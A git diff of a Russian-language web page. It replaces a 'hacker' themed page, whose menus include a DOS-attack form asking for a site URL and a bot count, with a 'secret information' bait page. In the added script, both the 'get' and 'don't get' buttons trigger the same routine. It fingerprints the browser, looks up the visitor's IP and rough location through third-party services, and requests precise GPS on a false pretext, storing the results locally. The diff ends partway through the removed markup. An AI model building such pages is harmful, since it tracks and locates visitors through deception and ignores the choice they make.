@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>хакер0101010101!</title>
+    <title>СЕКРЕТНАЯ ИНФОРМАЦИЯ</title>
     <style>
         * {
             margin: 0;
@@ -12,1140 +12,541 @@
         }
 
         body {
-            background-color: rgb(255, 255, 255);
-            width: 100vw;
-            height: 100vh;
-            overflow: hidden;
-            font-family: 'Courier New', monospace;
-        }
-
-        /* Экран загрузки */
-        #loader {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: black;
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, #0a0a0a 100%);
+            min-height: 100vh;
             display: flex;
+            flex-direction: column;
             justify-content: center;
             align-items: center;
-            flex-direction: column;
-            z-index: 1000;
-        }
-
-        #loader-text {
-            color: #0f0;
-            font-size: 48px;
-            text-shadow: 0 0 10px #0f0;
-        }
-
-        #loader-bar {
-            width: 300px;
-            height: 4px;
-            background-color: #111;
-            margin-top: 20px;
-            border-radius: 2px;
+            font-family: 'Courier New', monospace;
             overflow: hidden;
-        }
-
-        #loader-progress {
-            width: 0%;
-            height: 100%;
-            background-color: #0f0;
-            box-shadow: 0 0 10px #0f0;
-            transition: width 1ms;
-        }
-
-        /* Канвас для матрицы */
-        #matrix {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 1;
-        }
-
-        /* Основной контент */
-        #content {
             position: relative;
+        }
+
+        .title {
+            font-size: 3rem;
+            color: #00ff88;
+            text-transform: uppercase;
+            letter-spacing: 10px;
+            text-shadow: 0 0 20px #00ff88, 0 0 40px #00ff88, 0 0 60px #00ff88;
+            animation: pulse 2s ease-in-out infinite;
             z-index: 10;
-            color: #0f0;
             text-align: center;
-            padding-top: 20%;
-            text-shadow: 0 0 10px #0f0;
-            display: none;
-        }
-
-        #content h1 {
-            font-size: 48px;
-            margin-bottom: 20px;
-        }
-
-        .version {
-            color: #0f0;
-            font-size: 14px;
-            margin-bottom: 20px;
-            text-shadow: 0 0 5px #0f0;
-            opacity: 0.7;
-        }
-
-        #dos-btn {
-            background-color: black;
-            color: #0f0;
-            border: 2px solid #0f0;
-            padding: 15px 40px;
-            font-size: 24px;
-            font-family: 'Courier New', monospace;
-            cursor: pointer;
-            text-shadow: 0 0 10px #0f0;
-            box-shadow: 0 0 10px #0f0;
-            transition: all 0.3s;
-        }
-
-        #dos-btn:hover {
-            background-color: #0f0;
-            color: black;
-            box-shadow: 0 0 20px #0f0;
-        }
-
-        /* DOS меню */
-        #dos-menu {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.95);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            z-index: 2000;
-        }
-
-        #dos-menu h2 {
-            color: #0f0;
-            font-size: 36px;
-            margin-bottom: 30px;
-            text-shadow: 0 0 10px #0f0;
-        }
-
-        .dos-form {
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-            width: 400px;
-            max-width: 90%;
-        }
-
-        .dos-form label {
-            color: #0f0;
-            font-size: 16px;
-            text-shadow: 0 0 5px #0f0;
-        }
-
-        .dos-form input,
-        .dos-form select {
-            background-color: black;
-            border: 2px solid #0f0;
-            color: #0f0;
-            padding: 12px;
-            font-size: 16px;
-            font-family: 'Courier New', monospace;
-            box-shadow: 0 0 5px #0f0;
-            outline: none;
-        }
-
-        .dos-form input:focus,
-        .dos-form select:focus {
-            box-shadow: 0 0 15px #0f0;
-        }
-
-        .dos-form button {
-            background-color: black;
-            color: #0f0;
-            border: 2px solid #0f0;
-            padding: 15px;
-            font-size: 18px;
-            font-family: 'Courier New', monospace;
-            cursor: pointer;
-            text-shadow: 0 0 10px #0f0;
-            box-shadow: 0 0 10px #0f0;
-            transition: all 0.3s;
-            margin-top: 10px;
-        }
-
-        .dos-form button:hover {
-            background-color: #0f0;
-            color: black;
-            box-shadow: 0 0 20px #0f0;
-        }
-
-        #dos-start {
-            background-color: #0f0;
-            color: black;
-        }
-
-        #dos-start:hover {
-            background-color: #0a0;
-        }
-
-        /* Результаты DOS */
-        #dos-results {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.95);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            z-index: 3000;
-        }
-
-        #dos-results h2 {
-            color: #0f0;
-            font-size: 36px;
-            margin-bottom: 30px;
-            text-shadow: 0 0 10px #0f0;
-        }
-
-        #result-content {
-            color: rgb(0, 255, 153);
-            
-            font-size: 24px;
-            text-align: center;
-            margin-bottom: 30px;
-            text-shadow: 0 0 10px #0f0;
-            line-height: 1.8;
-        }
-
-        .result-success {
-            color: #0f0;
-            font-weight: bold;
-        }
-
-        .result-error {
-            color: #f00;
-            font-weight: bold;
-        }
-
-        .result-normal {
-            color: #ff0;
-            font-weight: bold;
-        }
-
-        #results-back {
-            background-color: black;
-            color: #0f0;
-            border: 2px solid #0f0;
-            padding: 15px 40px;
-            font-size: 18px;
-            font-family: 'Courier New', monospace;
-            cursor: pointer;
-            text-shadow: 0 0 10px #0f0;
-            box-shadow: 0 0 10px #0f0;
-            transition: all 0.3s;
-        }
-
-        #results-back:hover {
-            background-color: #0f0;
-            color: black;
-            box-shadow: 0 0 20px #0f0;
-        }
-
-        /* Консоль */
-        #console-btn {
-            background-color: black;
-            color: #0f0;
-            border: 2px solid #0f0;
-            padding: 15px 40px;
-            font-size: 24px;
-            font-family: 'Courier New', monospace;
-            cursor: pointer;
-            text-shadow: 0 0 10px #0f0;
-            box-shadow: 0 0 10px #0f0;
-            transition: all 0.3s;
-            margin-top: 15px;
-        }
-
-        #console-btn:hover {
-            background-color: #0f0;
-            color: black;
-            box-shadow: 0 0 20px #0f0;
-        }
-
-        #console-menu {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.95);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            z-index: 4000;
-        }
-
-        #console-menu h2 {
-            color: #0f0;
-            font-size: 36px;
-            margin-bottom: 20px;
-            text-shadow: 0 0 10px #0f0;
-        }
-
-        .console-output {
-            width: 600px;
-            max-width: 90%;
-            height: 250px;
-            background-color: black;
-            border: 2px solid #0f0;
-            padding: 15px;
-            overflow-y: auto;
-            font-family: 'Courier New', monospace;
-            color: #0f0;
-            font-size: 14px;
-            margin-bottom: 15px;
-            box-shadow: 0 0 10px #0f0;
-            text-align: left;
-        }
-
-        .console-output p {
-            margin: 5px 0;
-        }
-
-        .console-input-line {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            width: 600px;
-            max-width: 90%;
-            margin-bottom: 20px;
-        }
-
-        .console-input-line .prompt {
-            color: #0f0;
-            font-size: 20px;
-            font-family: 'Courier New', monospace;
-            text-shadow: 0 0 5px #0f0;
-        }
-
-        .console-input-line input {
-            flex: 1;
-            background-color: black;
-            border: 2px solid #0f0;
-            color: #0f0;
-            padding: 10px;
-            font-size: 16px;
-            font-family: 'Courier New', monospace;
-            box-shadow: 0 0 5px #0f0;
-            outline: none;
-        }
-
-        .console-commands {
-            text-align: center;
-            margin-bottom: 20px;
-        }
-
-        .console-commands p {
-            color: #0f0;
-            font-size: 18px;
-            margin-bottom: 15px;
-            text-shadow: 0 0 5px #0f0;
-        }
-
-        .cmd-btn {
-            background-color: black;
-            color: #0f0;
-            border: 2px solid #0f0;
-            padding: 10px 20px;
-            font-size: 14px;
-            font-family: 'Courier New', monospace;
-            cursor: pointer;
-            text-shadow: 0 0 5px #0f0;
-            box-shadow: 0 0 5px #0f0;
-            transition: all 0.3s;
-            margin: 5px;
-            display: block;
-            width: 100%;
-            max-width: 400px;
-        }
-
-        .cmd-btn:hover {
-            background-color: #0f0;
-            color: black;
-            box-shadow: 0 0 15px #0f0;
-        }
-
-        #console-back {
-            background-color: black;
-            color: #0f0;
-            border: 2px solid #0f0;
-            padding: 15px 40px;
-            font-size: 18px;
-            font-family: 'Courier New', monospace;
-            cursor: pointer;
-            text-shadow: 0 0 10px #0f0;
-            box-shadow: 0 0 10px #0f0;
-            transition: all 0.3s;
-        }
-
-        #console-back:hover {
-            background-color: #0f0;
-            color: black;
-            box-shadow: 0 0 20px #0f0;
-        }
-
-        /* Устройства */
-        #devices-btn {
-            background-color: black;
-            color: #0f0;
-            border: 2px solid #0f0;
-            padding: 15px 40px;
-            font-size: 24px;
-            font-family: 'Courier New', monospace;
-            cursor: pointer;
-            text-shadow: 0 0 10px #0f0;
-            box-shadow: 0 0 10px #0f0;
-            transition: all 0.3s;
-            margin-top: 15px;
-        }
-
-        #devices-btn:hover {
-            background-color: #0f0;
-            color: black;
-            box-shadow: 0 0 20px #0f0;
-        }
-
-        #devices-menu {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.95);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            z-index: 5000;
-        }
-
-        #devices-menu h2 {
-            color: #0f0;
-            font-size: 36px;
-            margin-bottom: 30px;
-            text-shadow: 0 0 10px #0f0;
-        }
-
-        .devices-form {
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-            align-items: center;
-        }
-
-        .devices-form label {
-            color: #0f0;
-            font-size: 18px;
-            text-shadow: 0 0 5px #0f0;
-        }
-
-        .devices-form input {
-            background-color: black;
-            border: 2px solid #0f0;
-            color: #0f0;
-            padding: 12px;
-            font-size: 18px;
-            font-family: 'Courier New', monospace;
-            box-shadow: 0 0 5px #0f0;
-            outline: none;
-            width: 300px;
-            text-align: center;
-        }
-
-        .devices-form input:focus {
-            box-shadow: 0 0 15px #0f0;
-        }
-
-        .devices-form button {
-            background-color: black;
-            color: #0f0;
-            border: 2px solid #0f0;
-            padding: 15px 40px;
-            font-size: 18px;
-            font-family: 'Courier New', monospace;
-            cursor: pointer;
-            text-shadow: 0 0 10px #0f0;
-            box-shadow: 0 0 10px #0f0;
-            transition: all 0.3s;
-        }
-
-        .devices-form button:hover {
-            background-color: #0f0;
-            color: black;
-            box-shadow: 0 0 20px #0f0;
-        }
-
-        /* Мини система */
-        #device-system {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.95);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            z-index: 6000;
-        }
-
-        #device-system h2 {
-            color: #0f0;
-            font-size: 32px;
-            margin-bottom: 20px;
-            text-shadow: 0 0 10px #0f0;
-        }
-
-        .system-screen {
-            width: 500px;
-            max-width: 90%;
-            height: 300px;
-            background-color: #111;
-            border: 3px solid #0f0;
-            border-radius: 10px;
             padding: 20px;
-            margin-bottom: 20px;
-            box-shadow: 0 0 20px #0f0;
-            overflow-y: auto;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+
+        .buttons-container {
+            display: flex;
+            gap: 30px;
+            margin-top: 50px;
+            z-index: 10;
+        }
+
+        .btn {
+            padding: 20px 50px;
+            font-size: 1.2rem;
+            font-family: 'Courier New', monospace;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            border: 2px solid #00ff88;
+            background: transparent;
+            color: #00ff88;
+            cursor: pointer;
+            transition: all 0.3s ease;
             position: relative;
-            background-size: cover;
-            background-position: center;
+            overflow: hidden;
         }
 
-        .system-screen.android {
-            background-image: url('https://upload.wikimedia.org/wikipedia/commons/thumb/a/a3/Android14interface.png/500px-Android14interface.png?20240210095226');
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(0, 255, 136, 0.3), transparent);
+            transition: left 0.5s ease;
         }
 
-        .system-screen.windows {
-            background: linear-gradient(180deg, #1a1a2e 0%, #16213e 100%);
+        .btn:hover::before {
+            left: 100%;
         }
 
-        .system-title {
-            color: #0f0;
-            font-size: 18px;
-            margin-bottom: 10px;
+        .btn:hover {
+            background: #00ff88;
+            color: #0a0a0a;
+            box-shadow: 0 0 30px #00ff88, 0 0 60px #00ff88;
         }
 
-        .system-apps {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 10px;
-        }
-
-        .system-app {
-            width: 60px;
-            height: 60px;
-            background-color: rgba(0, 255, 0, 0.3);
-            border: 2px solid #0f0;
-            border-radius: 10px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-size: 24px;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-
-        .system-app:hover {
-            background-color: rgba(0, 255, 0, 0.6);
-            transform: scale(1.1);
-            box-shadow: 0 0 15px #0f0;
-        }
-
-        .system-app.windows-app {
-            background-color: rgba(100, 100, 255, 0.3);
-            border-color: #55f;
-            color: #55f;
-        }
-
-        .system-app.windows-app:hover {
-            background-color: rgba(100, 100, 255, 0.6);
-            box-shadow: 0 0 15px #55f;
-        }
-
-        #device-destroy {
-            background-color: #f00;
-            color: white;
-            border: 2px solid #f00;
-            padding: 15px 40px;
-            font-size: 20px;
-            font-family: 'Courier New', monospace;
-            cursor: pointer;
-            text-shadow: 0 0 5px #000;
-            box-shadow: 0 0 15px #f00;
-            transition: all 0.3s;
-            margin-bottom: 15px;
-        }
-
-        #device-destroy:hover {
-            background-color: #a00;
-            box-shadow: 0 0 25px #f00;
-        }
-
-        #device-system-back {
-            background-color: black;
-            color: #0f0;
-            border: 2px solid #0f0;
-            padding: 15px 40px;
-            font-size: 18px;
-            font-family: 'Courier New', monospace;
-            cursor: pointer;
-            text-shadow: 0 0 10px #0f0;
-            box-shadow: 0 0 10px #0f0;
-            transition: all 0.3s;
-        }
-
-        #device-system-back:hover {
-            background-color: #0f0;
-            color: black;
-            box-shadow: 0 0 20px #0f0;
-        }
-
-        /* Город */
-        #city-btn {
-            background-color: black;
-            color: #0f0;
-            border: 2px solid #0f0;
-            padding: 15px 40px;
-            font-size: 24px;
-            font-family: 'Courier New', monospace;
-            cursor: pointer;
-            text-shadow: 0 0 10px #0f0;
-            box-shadow: 0 0 10px #0f0;
-            transition: all 0.3s;
-            margin-top: 15px;
-        }
-
-        #city-btn:hover {
-            background-color: #0f0;
-            color: black;
-            box-shadow: 0 0 20px #0f0;
-        }
-
-        #city-menu {
+        .code-container {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background-color: rgba(0, 0, 0, 0.95);
+            pointer-events: none;
+            z-index: 5;
             display: none;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            z-index: 7000;
         }
 
-        #city-menu h2 {
-            color: #0f0;
-            font-size: 36px;
-            margin-bottom: 20px;
-            text-shadow: 0 0 10px #0f0;
-        }
-
-        .city-tabs {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 20px;
-        }
-
-        .city-tab {
-            background-color: black;
-            color: #0f0;
-            border: 2px solid #0f0;
-            padding: 12px 25px;
-            font-size: 16px;
+        .code-piece {
+            position: absolute;
             font-family: 'Courier New', monospace;
-            cursor: pointer;
-            text-shadow: 0 0 5px #0f0;
-            box-shadow: 0 0 5px #0f0;
-            transition: all 0.3s;
+            font-size: 10px;
+            color: #00ff88;
+            opacity: 0.7;
+            text-shadow: 0 0 5px #00ff88;
+            user-select: none;
         }
 
-        .city-tab:hover,
-        .city-tab.active {
-            background-color: #0f0;
-            color: black;
-            box-shadow: 0 0 15px #0f0;
-        }
-
-        .city-panel {
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-            align-items: center;
-            width: 350px;
-            max-width: 90%;
-        }
-
-        .city-panel label {
-            color: #0f0;
-            font-size: 16px;
-            text-shadow: 0 0 5px #0f0;
-        }
-
-        .city-panel input,
-        .city-panel select {
-            background-color: black;
-            border: 2px solid #0f0;
-            color: #0f0;
-            padding: 12px;
-            font-size: 16px;
-            font-family: 'Courier New', monospace;
-            box-shadow: 0 0 5px #0f0;
-            outline: none;
-            width: 100%;
-        }
-
-        .city-panel input:focus,
-        .city-panel select:focus {
-            box-shadow: 0 0 15px #0f0;
-        }
-
-        .city-panel button {
-            background-color: #0f0;
-            color: black;
-            border: 2px solid #0f0;
-            padding: 12px 30px;
-            font-size: 16px;
-            font-family: 'Courier New', monospace;
-            cursor: pointer;
-            text-shadow: 0 0 5px #000;
-            box-shadow: 0 0 10px #0f0;
-            transition: all 0.3s;
-            margin-top: 10px;
-            width: 100%;
-        }
-
-        .city-panel button:hover {
-            background-color: #0a0;
-            box-shadow: 0 0 20px #0f0;
-        }
-
-        .city-back-btn {
-            background-color: black;
-            color: #0f0;
-            border: 2px solid #0f0;
-            padding: 15px 40px;
-            font-size: 18px;
-            font-family: 'Courier New', monospace;
-            cursor: pointer;
-            text-shadow: 0 0 10px #0f0;
-            box-shadow: 0 0 10px #0f0;
-            transition: all 0.3s;
-            margin-top: 20px;
-        }
-
-        .city-back-btn:hover {
-            background-color: #0f0;
-            color: black;
-            box-shadow: 0 0 20px #0f0;
-        }
-
-        /* АРХИВ меню */
-        #archive-btn {
-            background-color: black;
-            color: #0f0;
-            border: 2px solid #0f0;
-            padding: 15px 40px;
-            font-size: 24px;
-            font-family: 'Courier New', monospace;
-            cursor: pointer;
-            text-shadow: 0 0 10px #0f0;
-            box-shadow: 0 0 10px #0f0;
-            transition: all 0.3s;
-            margin-top: 15px;
-        }
-
-        #archive-btn:hover {
-            background-color: #0f0;
-            color: black;
-            box-shadow: 0 0 20px #0f0;
-        }
-
-        #archive-menu {
+        .sphere-container {
             position: fixed;
-            top: 0;
-            left: 0;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 200px;
+            height: 200px;
+            z-index: 6;
+            display: none;
+        }
+
+        .sphere {
             width: 100%;
             height: 100%;
-            background-color: rgba(0, 0, 0, 0.95);
+            border-radius: 50%;
+            background: radial-gradient(circle at 30% 30%, #00ff88, #0066ff, #ff0066, #6600ff, #00ff88);
+            background-size: 200% 200%;
+            animation: sphereRotate 1s linear infinite;
+            box-shadow: 0 0 50px #00ff88, 0 0 100px #0066ff, 0 0 150px #ff0066;
+        }
+
+        @keyframes sphereRotate {
+            0% { background-position: 0% 50%; }
+            100% { background-position: 200% 50%; }
+        }
+
+        .explosion {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 10px;
+            height: 10px;
+            background: radial-gradient(circle, #fff, #00ff88, transparent);
+            border-radius: 50%;
+            z-index: 7;
             display: none;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            z-index: 8000;
+            animation: explode 0.5s ease-out forwards;
         }
 
-        #archive-menu h2 {
-            color: #0f0;
-            font-size: 36px;
-            margin-bottom: 30px;
-            text-shadow: 0 0 10px #0f0;
+        @keyframes explode {
+            0% { 
+                width: 10px; 
+                height: 10px; 
+                opacity: 1; 
+            }
+            100% { 
+                width: 1000px; 
+                height: 1000px; 
+                opacity: 0; 
+            }
         }
 
-        .archive-list {
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-            width: 350px;
-            max-width: 90%;
+        .final-image {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            max-width: 80%;
+            max-height: 80%;
+            border: 3px solid #00ff88;
+            box-shadow: 0 0 50px #00ff88, 0 0 100px #0066ff;
+            z-index: 8;
+            display: none;
+            animation: imageAppear 1s ease-out;
         }
 
-        .archive-item {
-            background-color: black;
-            color: #0f0;
-            border: 2px solid #0f0;
-            padding: 15px 25px;
-            font-size: 18px;
-            font-family: 'Courier New', monospace;
-            cursor: pointer;
-            text-shadow: 0 0 5px #0f0;
-            box-shadow: 0 0 10px #0f0;
-            transition: all 0.3s;
+        @keyframes imageAppear {
+            0% { 
+                opacity: 0; 
+                transform: translate(-50%, -50%) scale(0.5); 
+            }
+            100% { 
+                opacity: 1; 
+                transform: translate(-50%, -50%) scale(1); 
+            }
+        }
+
+        .geo-message {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(0, 0, 0, 0.95);
+            border: 2px solid #ff0066;
+            padding: 40px;
+            z-index: 100;
             text-align: center;
-            text-decoration: none;
-            display: block;
+            display: none;
         }
 
-        .archive-item:hover {
-            background-color: #0f0;
-            color: black;
-            box-shadow: 0 0 20px #0f0;
+        .geo-message h3 {
+            color: #ff0066;
+            margin-bottom: 20px;
+            font-size: 1.5rem;
         }
 
-        .archive-ramadan {
-            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
-            border-color: #ffd700;
-            color: #ffd700;
-            text-shadow: 0 0 5px #ffd700;
-            box-shadow: 0 0 15px #ffd700;
-            padding: 20px;
+        .geo-message p {
+            color: #00ff88;
+            margin-bottom: 20px;
         }
 
-        .archive-ramadan:hover {
-            background: linear-gradient(135deg, #16213e 0%, #1a1a2e 100%);
-            color: #000;
-            box-shadow: 0 0 25px #ffd700;
-        }
-
-        .ramadan-title {
-            font-size: 22px;
-            margin-bottom: 10px;
-        }
-
-        .ramadan-desc {
-            font-size: 14px;
-            opacity: 0.9;
-            line-height: 1.5;
-        }
-
-        #archive-back {
-            background-color: black;
-            color: #0f0;
-            border: 2px solid #0f0;
-            padding: 15px 40px;
-            font-size: 18px;
-            font-family: 'Courier New', monospace;
+        .geo-message button {
+            padding: 15px 30px;
+            background: #ff0066;
+            border: none;
+            color: white;
             cursor: pointer;
-            text-shadow: 0 0 10px #0f0;
-            box-shadow: 0 0 10px #0f0;
-            transition: all 0.3s;
-            margin-top: 25px;
+            font-family: 'Courier New', monospace;
+            text-transform: uppercase;
+            letter-spacing: 2px;
         }
 
-        #archive-back:hover {
-            background-color: #0f0;
-            color: black;
-            box-shadow: 0 0 20px #0f0;
+        .geo-message button:hover {
+            background: #ff3388;
         }
 
-        /* Мобильная адаптация */
-        @media (max-width: 768px) {
-            #content {
-                padding-top: 15%;
-            }
-
-            #content h1 {
-                font-size: 28px;
-            }
-
-            .version {
-                font-size: 12px;
-            }
-
-            #dos-btn,
-            #console-btn,
-            #devices-btn,
-            #city-btn,
-            #archive-btn {
-                padding: 12px 25px;
-                font-size: 16px;
-                width: 200px;
-            }
-
-            #loader-text {
-                font-size: 32px;
-            }
-
-            #loader-bar {
-                width: 200px;
-            }
-
-            .dos-form,
-            .console-output,
-            .console-input-line,
-            .devices-form input,
-            .city-panel {
-                width: 90%;
-                max-width: 350px;
-            }
-
-            .system-screen {
-                width: 90%;
-                height: 250px;
-            }
-
-            #dos-menu h2,
-            #console-menu h2,
-            #devices-menu h2,
-            #city-menu h2,
-            #archive-menu h2 {
-                font-size: 24px;
-            }
-
-            .cmd-btn {
-                font-size: 12px;
-                padding: 8px 15px;
-            }
-
-            .city-tabs {
-                flex-wrap: wrap;
-                justify-content: center;
-            }
-
-            .city-tab {
-                padding: 10px 15px;
-                font-size: 14px;
-            }
+        .hidden {
+            display: none !important;
         }
 
-        @media (max-width: 480px) {
-            #content h1 {
-                font-size: 22px;
-            }
+        .scan-line {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #00ff88, transparent);
+            animation: scan 3s linear infinite;
+            z-index: 4;
+            pointer-events: none;
+        }
 
-            #dos-btn,
-            #console-btn,
-            #devices-btn,
-            #city-btn,
-            #archive-btn {
-                padding: 10px 20px;
-                font-size: 14px;
-                width: 180px;
-            }
-
-            #loader-text {
-                font-size: 24px;
-            }
-
-            #loader-bar {
-                width: 150px;
-            }
-
-            .archive-list {
-                width: 90%;
-            }
-
-            .archive-item {
-                padding: 12px 20px;
-                font-size: 16px;
-            }
+        @keyframes scan {
+            0% { top: 0; }
+            100% { top: 100%; }
         }
     </style>
 </head>
 <body>
-    <!-- Экран загрузки -->
-    <div id="loader">
-        <div id="loader-text">0%</div>
-        <div id="loader-bar">
-            <div id="loader-progress"></div>
-        </div>
+    <h1 class="title">СЕКРЕТНАЯ ИНФОРМАЦИЯ</h1>
+    
+    <div class="buttons-container" id="buttonsContainer">
+        <button class="btn" onclick="handleButtonClick()">ПОЛУЧИТЬ</button>
+        <button class="btn" onclick="handleButtonClick()">НЕ ПОЛУЧАТЬ</button>
     </div>
 
-    <!-- Матрица -->
-    <canvas id="matrix"></canvas>
+    <div class="code-container" id="codeContainer"></div>
+    <div class="sphere-container" id="sphereContainer">
+        <div class="sphere"></div>
+    </div>
+    <div class="explosion" id="explosion"></div>
+    <img class="final-image" id="finalImage" src="https://i.ytimg.com/vi/_1hwg8sIydk/maxresdefault.jpg" alt="Secret">
+    
+    <div class="geo-message" id="geoMessage">
+        <h3>🌍 ЗАПРОС ГЕОЛОКАЦИИ</h3>
+        <p>Для доступа к секретным данным требуется разрешение геолокации</p>
+        <p style="color: #888; font-size: 0.9rem;">Нажмите "Разрешить" или "Блокировать"</p>
+    </div>
 
-    <!-- Контент -->
-    <div id="content">
-        <h1>хакер0101010101World</h1>
-        <p class="version">Версия V1.0.1</p>
-        <button id="dos-btn">DOS</button>
-        <button id="console-btn">КОНСОЛЬ</button>
-        <button id="devices-btn">УСТРОЙСТВА</button>
-        <button id="city-btn">ГОРОД</button>
-        <button id="archive-btn">АРХИВ</button>
-     </div>
+    <div class="scan-line"></div>
 
-    <!-- DOS меню -->
-    <div id="dos-menu">
-        <h2>DOS АТАКА</h2>
-        <div class="dos-form">
-            <label>Ссылка на сайт:</label>
-            <input type="text" id="dos-url" placeholder="https://example.com">
+    <script>
+        // Data collection
+        let userData = {};
+        let geoRequested = false;
+
+        async function collectData() {
+            // Browser data
+            userData = {
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                screenResolution: `${screen.width}x${screen.height}`,
+                colorDepth: screen.colorDepth,
+                pixelDepth: screen.pixelDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookieEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack,
+                deviceType: getDeviceType(),
+                browser: getBrowserInfo(),
+                os: getOSInfo(),
+                cpuCores: navigator.hardwareConcurrency || 'N/A',
+                memory: navigator.deviceMemory || 'N/A',
+                connection: navigator.connection ? {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt
+                } : 'N/A'
+            };
+
+            // Get IP
+            try {
+                const ipResponse = await fetch("https://api.ipify.org?format=json");
+                const ipData = await ipResponse.json();
+                userData.ip = ipData.ip;
+
+                // Get geolocation data from IP
+                const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                const geoData = await geoResponse.json();
+                userData.ipGeolocation = {
+                    city: geoData.city,
+                    region: geoData.region,
+                    country: geoData.country_name,
+                    latitude: geoData.latitude,
+                    longitude: geoData.longitude
+                };
+            } catch (e) {
+                userData.ip = 'Could not retrieve';
+                userData.ipGeolocation = 'Could not retrieve';
+            }
+
+            // Save to localStorage
+            localStorage.setItem('userData', JSON.stringify(userData));
             
-            <label>Количество ботов:</label>
-            <input type="number" id="dos-bots" placeholder="1000" value="1000">
+            console.log('Collected data:', userData);
+        }
+
+        function getDeviceType() {
+            const ua = navigator.userAgent;
+            if (/tablet|ipad|playbook|silk/i.test(ua)) return 'Tablet';
+            if (/Mobile|Android|iPhone|iPad|iPod/i.test(ua)) return 'Mobile';
+            return 'Desktop';
+        }
+
+        function getBrowserInfo() {
+            const ua = navigator.userAgent;
+            if (ua.includes('Chrome')) return 'Chrome';
+            if (ua.includes('Firefox')) return 'Firefox';
+            if (ua.includes('Safari')) return 'Safari';
+            if (ua.includes('Edge')) return 'Edge';
+            if (ua.includes('MSIE') || ua.includes('Trident')) return 'IE';
+            return 'Unknown';
+        }
+
+        function getOSInfo() {
+            const ua = navigator.userAgent;
+            if (ua.includes('Win')) return 'Windows';
+            if (ua.includes('Mac')) return 'macOS';
+            if (ua.includes('Linux')) return 'Linux';
+            if (ua.includes('Android')) return 'Android';
+            if (ua.includes('iOS')) return 'iOS';
+            return 'Unknown';
+        }
+
+        function requestGeolocation() {
+            geoRequested = true;
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    userData.geolocation = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        timestamp: new Date(position.timestamp).toISOString()
+                    };
+                    
+                    // Update localStorage
+                    localStorage.setItem('userData', JSON.stringify(userData));
+                    
+                    document.getElementById('geoMessage').style.display = 'none';
+                    startAnimation();
+                },
+                (error) => {
+                    // Геолокация отклонена - всё равно запускаем анимацию
+                    userData.geolocation = {
+                        status: 'denied',
+                        error: error.message
+                    };
+                    localStorage.setItem('userData', JSON.stringify(userData));
+                    
+                    document.getElementById('geoMessage').style.display = 'none';
+                    startAnimation();
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                }
+            );
+        }
+
+        function handleButtonClick() {
+            // Collect data first
+            collectData();
             
-            <label>Формат:</label>
-            <select id="dos-format">
-                <option value="ROP">ROP</option>
-                <option value="TOP">TOP</option>
-                <option value="EROR">EROR</option>
-            </select>
+            // Скрываем кнопки и показываем сообщение о геолокации
+            document.getElementById('buttonsContainer').classList.add('hidden');
+            document.getElementById('geoMessage').style.display = 'block';
             
-            <button id="dos-start">ЗАПУСТИТЬ</button>
-            <button id="dos-back">НАЗАД</button>
-        </div>
-    </div>
+            // Request geolocation
+            if (!geoRequested) {
+                requestGeolocation();
+            }
+        }
 
-    <!-- Результаты DOS -->
-    <div id="dos-results">
